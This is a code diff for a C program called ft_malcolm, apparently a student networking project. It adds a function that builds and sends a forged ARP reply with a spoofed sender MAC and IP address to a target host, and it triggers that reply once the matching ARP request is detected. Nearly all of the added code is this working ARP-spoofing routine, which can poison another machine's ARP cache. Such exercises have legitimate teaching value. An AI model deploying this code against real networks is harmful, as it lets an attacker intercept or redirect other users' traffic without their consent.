@@ -188,6 +188,45 @@ char *get_interface()
     return (NULL);
 }
 
+int send_arp_reply(t_session *session, t_options *opts)
+{
+    unsigned char buffer[sizeof(struct ethhdr) + sizeof(struct ether_arp)];
+    struct ethhdr *eth = (struct ethhdr *)buffer;
+    struct ether_arp *arp = (struct ether_arp *)(buffer + sizeof(struct ethhdr));
+
+    memset(buffer, 0, sizeof(buffer));
+
+    /* 1. Ethernet Header */
+    memcpy(eth->h_dest, opts->target_mac, 6);       /* Unicast to Target */
+    memcpy(eth->h_source, opts->src_mac, 6);        /* Spoofed Source MAC */
+    eth->h_proto = htons(ETH_P_ARP);
+
+    /* 2. ARP Reply Header */
+    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
+    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
+    arp->ea_hdr.ar_hln = 6;
+    arp->ea_hdr.ar_pln = 4;
+    arp->ea_hdr.ar_op  = htons(ARPOP_REPLY);        /* Opcode 2 = Reply */
+
+    /* Sender Info (Spoofed Identity) */
+    memcpy(arp->arp_sha, opts->src_mac, 6);
+    memcpy(arp->arp_spa, &opts->src_ip, 4);
+
+    /* Target Info (Victim Identity) */
+    memcpy(arp->arp_tha, opts->target_mac, 6);
+    memcpy(arp->arp_tpa, &opts->target_ip, 4);
+
+    /* 3. Send over the EXISTING socket */
+    if (sendto(session->sockfd, buffer, sizeof(buffer), 0,
+               (struct sockaddr *)&session->sll, sizeof(session->sll)) < 0)
+    {
+        ft_putstr_fd("[ft_malcolm] sendto() failed.\n", 2);
+        return (-1);
+    }
+
+    return (0);
+}
+
 int work(t_options opts)
 {
     t_session session;
@@ -258,6 +297,8 @@ int work(t_options opts)
                         memcmp(arp->arp_tpa, &opts.src_ip, 4) == 0)
                 {
                     printf("Matching ARP request detected! Preparing reply...\n");
+                    send_arp_reply(&session, &opts);
+                    printf("ARP reply was sent! Exiting right now...\n");
                     break;
                 }
             }
@@ -345,8 +386,6 @@ int main(int ac, char **av)
         ft_putstr_fd("[ft_malcolm] Error occurred while parsing cmd args.\n", 2);
         return -1;
     }
-
     work(opts);
-
     return 0;
 }
